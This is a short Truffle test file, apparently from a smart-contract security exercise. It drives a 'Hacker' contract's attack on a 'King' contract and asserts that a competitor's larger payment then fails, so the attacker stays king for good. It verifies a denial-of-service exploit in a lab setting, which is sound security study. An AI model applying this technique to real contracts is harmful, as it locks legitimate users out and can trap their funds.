const Hacker = artifacts.require("Hacker");
const King = artifacts.require("King");
const { expect } = require("chai");
const utils = require("./helpers/utils");

/*
 * uncomment accounts to access the test accounts made available by the
 * Ethereum client
 * See docs: https://www.trufflesuite.com/docs/truffle/testing/writing-tests-in-javascript
 */
contract("Hacker", function ([_owner, _hacker, _competitor]) {
  it("should be a pemanent king", async function () {
    const hackerContract = await Hacker.deployed();
    const targetContract = await King.deployed();

    // be a king
    const result = await hackerContract.attack(targetContract.address, { from: _hacker, value: web3.utils.toWei("1", "ether") });
    expect(result.receipt.status).to.equal(true);
    let king = await targetContract._king();
    expect(king).to.equal(hackerContract.address);

    // competitor attempt
    await utils.shouldThrow(targetContract.send({ from: _competitor, value: web3.utils.toWei("2", "ether") }));

    // stay to be a king
    king = await targetContract._king();
    expect(king).to.equal(hackerContract.address);
  });
});
